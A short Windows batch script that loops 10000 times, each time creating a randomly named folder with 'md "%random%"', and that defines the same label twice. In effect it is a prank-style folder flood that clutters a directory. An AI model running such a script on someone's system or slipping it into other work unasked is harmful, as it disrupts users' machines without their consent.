@echo off
setlocal

:CreateFolders
md "%random%"

rem Increase the number of iterations to create more folders
set /a "iterations=10000"

for /l %%i in (1, 1, %iterations%) do (
    call :CreateFolders
)

exit /b

:CreateFolders
md "%random%"
exit /b
